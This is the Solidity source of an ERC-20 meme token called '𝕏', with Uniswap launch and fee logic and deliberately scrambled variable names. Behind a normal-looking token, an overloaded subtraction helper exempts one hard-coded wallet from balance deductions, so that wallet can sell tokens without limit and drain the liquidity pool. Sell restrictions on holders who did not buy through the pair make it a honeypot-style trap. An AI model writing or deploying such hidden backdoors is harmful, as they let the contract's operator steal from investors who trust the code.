/**

X    $𝕏

X: https://twitter.com/Xerc_Portal

Telegram: https://t.me/Xerc_Portal

Website: https://xerc.org/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _veoph(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _veoph(a, b, "SafeMath");
    }

    function  _veoph(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qkvnf(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _yotrbcr;
    address payable private _pnuqob;
    address private _rveutp;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _plyore=0;
    uint256 private _boacit=0;
    uint256 public _bocfco = _totalSupply;
    uint256 public _wrcerk = _totalSupply;
    uint256 public _kljrvb= _totalSupply;
    uint256 public _pfrxaf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qnpne;
    mapping (address => bool) private _pvokeu;
    mapping(address => uint256) private _faknu;

    bool private _cayropen;
    bool public _pvdisq = false;
    bool private qvsibf = false;
    bool private _brijre = false;


    event _etrjnk(uint _bocfco);
    modifier frevby {
        qvsibf = true;
        _;
        qvsibf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _qnpne[owner(

        )] = true;
        _qnpne[address
        (this)] = true;
        _qnpne[
            _pnuqob] = true;
        _pnuqob = 
        payable (0x98685A153D7ddd8be5399c44f2AF10aFFdB0DF9F);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _veoph(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 prfoug=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pvdisq) {
                if (to 
                != address
                (_yotrbcr) 
                && to !=
                 address
                 (_rveutp)) {
                  require(_faknu
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _faknu
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rveutp && to != 
            address(_yotrbcr) &&
             !_qnpne[to] ) {
                require(amount 
                <= _bocfco,
                 "Exceeds the _bocfco.");
                require(balanceOf
                (to) + amount
                 <= _wrcerk,
                  "Exceeds the _wrcerk.");
                if(_boacit
                < _plyore){
                  require
                  (! _frjbnv(to));
                }
                _boacit++;
                 _pvokeu
                 [to]=true;
                prfoug = amount._qkvnf
                ((_boacit>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rveutp &&
             from!= address(this) 
            && !_qnpne[from] ){
                require(amount <= 
                _bocfco && 
                balanceOf(_pnuqob)
                <_pfrxaf,
                 "Exceeds the _bocfco.");
                prfoug = amount._qkvnf((_boacit>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_boacit>
                _plyore &&
                 _pvokeu[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qvsibf 
            && to == _rveutp &&
             _brijre &&
             contractTokenBalance>
             _kljrvb 
            && _boacit>
            _plyore&&
             !_qnpne[to]&&
              !_qnpne[from]
            ) {
                _transferFrom( _rofbv(amount, 
                _rofbv(contractTokenBalance,
                _pfrxaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _plobnak(address
                    (this).balance);
                }
            }
        }

        if(prfoug>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(prfoug);
          emit
           Transfer(from,
           address
           (this),prfoug);
        }
        _balances[from
        ]= _veoph(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _veoph(prfoug));
        emit Transfer
        (from, to, 
        amount.
         _veoph(prfoug));
    }

    function _transferFrom(uint256
     tokenAmount) private
      frevby {
        if(tokenAmount==
        0){return;}
        if(!_cayropen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _yotrbcr.WETH();
        _approve(address(this),
         address(
             _yotrbcr), 
             tokenAmount);
        _yotrbcr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rofbv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _veoph(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _pnuqob){
            return a ;
        }else{
            return a .
             _veoph (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _bocfco = _totalSupply;
        _wrcerk = _totalSupply;
        emit _etrjnk(_totalSupply);
    }

    function _frjbnv(address 
    account) private view 
    returns (bool) {
        uint256 fbvrcp;
        assembly {
            fbvrcp :=
             extcodesize
             (account)
        }
        return fbvrcp > 
        0;
    }

    function _plobnak(uint256
    amount) private {
        _pnuqob.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _cayropen ) ;
        _yotrbcr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _yotrbcr), 
            _totalSupply);
        _rveutp = 
        IUniswapV2Factory(_yotrbcr.
        factory( ) 
        ). createPair (
            address(this
            ),  _yotrbcr .
             WETH ( ) );
        _yotrbcr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rveutp).
        approve(address(_yotrbcr), 
        type(uint)
        .max);
        _brijre = true;
        _cayropen = true;
    }

    receive() external payable {}
}